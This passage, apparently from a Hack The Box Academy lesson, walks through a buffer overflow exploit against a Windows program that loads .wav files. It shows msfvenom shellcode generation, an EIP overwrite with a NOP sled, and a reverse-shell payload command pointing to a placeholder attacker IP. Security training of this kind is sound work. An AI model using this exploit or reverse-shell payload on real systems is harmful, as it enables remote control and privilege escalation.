## Table of Contents

  - [The Final Payload](#The\Final\Payload)
  - [Shellcode Padding](#Shellcode\Padding)


So, to generate our shellcode, we will use `msfvenom`, which can generate shellcodes for Windows systems, while tools like `pwntools` currently only support Linux shellcodes.

First, we can list all available payloads for `Windows 32-bit`, as follows:
```shell
msfvenom -l payloads | grep


windows/exec               Execute an arbitrary command
    
windows/format_all_drives         This payload formats all mounted disks in Windows (aka ShellcodeOfDeath). After formatting, this payload sets the volume label to the string specified in the VOLUMELABEL option. If the code is unable to access a drive for

windows/loadlibrary        Load an arbitrary library path
    
windows/messagebox           Spawns a dialog via MessageBox using a customizable title, text & icon
```

For initial testing, let's try `windows/exec` and execute `calc.exe` to open the Windows calculator if our exploit is successful. To do this, we'll use `CMD=calc.exe`, `-f 'python'` since we are using a python exploit, and `-b` to specify any bad characters:

```shell-session
gdxqpardo@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
```

## The Final Payload

Now that we have our shellcode, we can write the final payload that we'll write to the `.wav` file to be opened in our program. So far, we know the following:

1. `buffer`: We can fill the buffer by writing `b"A"*offset`
2. `EIP`: The following 4 bytes should be our return address
3. `buf`: After that, we can add our shellcode

To convert it from `hex` to an address in Little Endian, we'll use a python function called `pack` found in the `struct` library. We can import this function by adding the following line at the beginning of our code:
```python
from struct import pack
```

Now we can use `pack` to turn our address into its proper format, and use '`<L`' to specify that we want it in Little Endian formatting:
```python
   offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
```

---

## Shellcode Padding

Now that we have `buffer` and `eip`, we can add our shellcode `buf` after them and generate our `.wav` file. However, depending on the program's current Stack Frame and Stack Alignment, by the time our `JMP ESP` instruction is executed, the top of the stack address `ESP` may have moved slightly. The first few bytes of our shellcode may get skipped, which will lead the shellcode to fail. (You can check the [Intro to Assembly Language](https://academy.hackthebox.com/module/details/85) module to get a better understanding of Stack Alignment).

One way to solve this is to add a few junk bytes before our shellcode and keep testing the code until we find out exactly how many bytes get skipped before our shellcode. This is so we can precisely land at the beginning of our shellcode when our `JMP ESP` instruction is executed. However, we only need to resort to this method if we had a limited buffer space since it takes several attempts to precisely find which byte position of our shellcode the execution starts.

To avoid having to do this, we can add a few `NOP` bytes before our shellcode, which has the machine code `0x90`. The assembly instruction `NOP` is short for `No Operation`, and it is used in assembly for things like waiting for other operations to finish. So, if the `JMP ESP` execution starts at one of these bytes, the program will not crash and will execute these bytes by doing nothing until it reaches the beginning of our shellcode. At which point, our entire shellcode should get executed and should run successfully.

The stack alignment needed is usually not more than `16` bytes in most cases, and it may rarely reach `32` bytes. Since we have a lot of buffer space, we'll just add `32` bytes of `NOP` before our shellcode, which should guarantee that the execution starts somewhere within these bytes, and continue to execute our main shellcode:

Code: python

```python
    nop = b"\x90"*32
```

If we wanted to get a reverse shell, there are many `msfvenom` payloads we can use, which we can get a list of as follows:

```shell-session
gdxqpardo@htb[/htb]$ msfvenom -l payloads | grep windows | grep reverse

...SNIP...
    windows/shell/reverse_tcp                           Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_allports                  Spawn a piped command shell (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/shell/reverse_tcp_dns                       Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_rc4                       Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_rc4_dns                   Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_uuid                      Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
    windows/shell/reverse_udp                           Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
    windows/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
...SNIP...
```

We can use the `windows/shell_reverse_tcp` payload as follows:

```shell-session
gdxqpardo@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=OUR_IP LPORT=OUR_LISTENING_PORT -f 'python'

...SNIP...
buf =  b""
buf += b"\xd9\xc8\xb8\x7c\x9f\x8c\x72\xd9\x74\x24\xf4\x5d\x33"
...SNIP...
```

We can replace the `buf` shellcode in our exploit with either of these and test it. Let's assume we have access to a machine where we have the privilege to run this program as an administrator. We will write the shellcode for local privilege escalation in our exploit, generate our `exploit.wav` file, and load it into the program:

